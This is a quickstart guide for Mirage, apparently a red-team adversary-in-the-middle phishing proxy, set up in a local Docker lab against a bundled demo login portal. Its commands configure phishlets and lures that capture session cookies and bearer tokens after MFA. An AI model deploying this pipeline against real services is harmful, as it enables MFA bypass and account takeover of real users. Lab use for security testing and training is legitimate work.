# Mirage Quickstart

This guide covers running mirage locally for testing without a real domain or ACME certificates. It uses Docker Compose to run `miraged` alongside the bundled target site — a simple login portal with MFA — so you can test the full AiTM pipeline end-to-end.

## Overview

Mirage is two binaries:

- **`miraged`** — the daemon (proxy, API, DNS)
- **`mirage`** — the operator CLI (talks to miraged over mTLS)

The quickstart runs `miraged` and the target site in a shared Docker network. Docker DNS resolves the target site's hostnames (`login.target.local`, `api.target.local`) inside the network, so the proxy can reach the target directly on port 443.

---

## 1. Build the CLI

The operator CLI runs on the host and communicates with `miraged` over mTLS.

```bash
make build
# produces build/miraged and build/mirage
```

> Only `build/mirage` (the CLI) is needed on the host — Docker Compose builds the `miraged` image separately.

---

## 2. Start the services

```bash
docker compose -f examples/quickstart/docker-compose.yml up -d
```

This starts two containers in a shared network:

| Service | Internal port | Host port | Purpose |
|---------|--------------|-----------|---------|
| `miraged` | 443 | 443 | Phishing proxy + management API |
| `target-site` | 443 | 8443 | Upstream login portal |

The target site is reachable from the host at `https://login.target.local:8443` and from `miraged` at `https://login.target.local:443` (via Docker DNS).

---

## 3. Add /etc/hosts entries

Point the phishing and target site hostnames at localhost:

```bash
echo "127.0.0.1  login.phish.local  api.phish.local  mgmt.phish.local" | sudo tee -a /etc/hosts
echo "127.0.0.1  login.target.local  api.target.local" | sudo tee -a /etc/hosts
```

> The phishing entries let your browser reach the proxy. The target site entries are optional — they let you browse the target site directly at `https://login.target.local:8443` to try the normal login flow. Inside the Docker network, `miraged` resolves these hostnames via Docker DNS.

---

## 4. Trust the self-signed CA in your browser

Copy the CA certificate from the container's data volume:

```bash
docker compose -f examples/quickstart/docker-compose.yml cp miraged:/var/lib/mirage/ca/mirage-ca.crt /tmp/mirage-ca.crt
```

Import `/tmp/mirage-ca.crt` as a trusted CA so the browser doesn't block requests to the phishing hostname.

- **Firefox:** Settings → Privacy & Security → View Certificates → Authorities → Import
- **Chrome:** Settings → Privacy and security → Security → Manage certificates → Authorities → Import

---

## 5. Enroll the operator

Check the daemon logs for the enrollment command:

```bash
docker compose -f examples/quickstart/docker-compose.yml logs miraged | grep "enroll with"
```

Copy and run it, adding `--alias local`:

```bash
./build/mirage server add --alias local --address 127.0.0.1:443 --secret-hostname mgmt.phish.local --token <token>
```

On success you'll see `Enrolled successfully. Server saved as "local".`

---

## 6. Push the phishlet, enable it, and create a lure

```bash
# Push the phishlet definition
./build/mirage phishlets push examples/phishlets/form-login.yaml

# Enable the phishlet on a hostname
./build/mirage phishlets enable form-login --hostname login.phish.local

# Create a lure (redirect URL is where victims land after token capture)
./build/mirage lures create form-login --redirect https://login.target.local:8443/demo-complete
```

Visit the printed lure URL in a browser that trusts the CA. You'll be taken to the standard login form. Sign in with any email and password, then enter any 6-digit code for MFA. Once MFA completes the session token is captured and the session is marked complete:

```bash
./build/mirage sessions list --completed
./build/mirage sessions show <session-id>
```

---

## File layout after first run

```txt
~/.mirage/                          # operator workstation
├── client.json                     # server config
├── local.crt                       # operator cert (enrolled)
├── local.key                       # operator private key
└── local-ca.crt                    # server's API CA cert
```

Server state (CA certs, database) is stored in the `mirage-data` Docker volume.

---

## Tips

- Run `docker compose -f examples/quickstart/docker-compose.yml logs -f miraged` to tail daemon logs.
- `./build/mirage` with no subcommand drops into an interactive REPL.
- The CLI `--json` flag outputs raw JSON for scripting.
- To start fresh, remove the volume: `docker compose -f examples/quickstart/docker-compose.yml down -v`

---

## Next steps

The target site includes two additional login flows you can test with different phishlets.

> **Tip:** Use an incognito window between tests. The proxy sets a session cookie that lasts one week — completed sessions redirect to the real site instead of showing the login page.

- **API login phishlet** — Captures bearer tokens from JSON responses instead of cookies.

  ```bash
  ./build/mirage phishlets push examples/phishlets/api-login.yaml
  ./build/mirage phishlets enable api-login --hostname login.phish.local
  ./build/mirage lures create api-login --redirect https://login.target.local:8443/demo-complete
  ```

- **Multi-host phishlet** — Proxies two subdomains (`login` and `api`), demonstrating cross-origin auth and multi-host routing.

  ```bash
  ./build/mirage phishlets push examples/phishlets/multi-host.yaml
  ./build/mirage phishlets enable multi-host --hostname login.phish.local
  ./build/mirage lures create multi-host --redirect https://login.target.local:8443/demo-complete
  ```
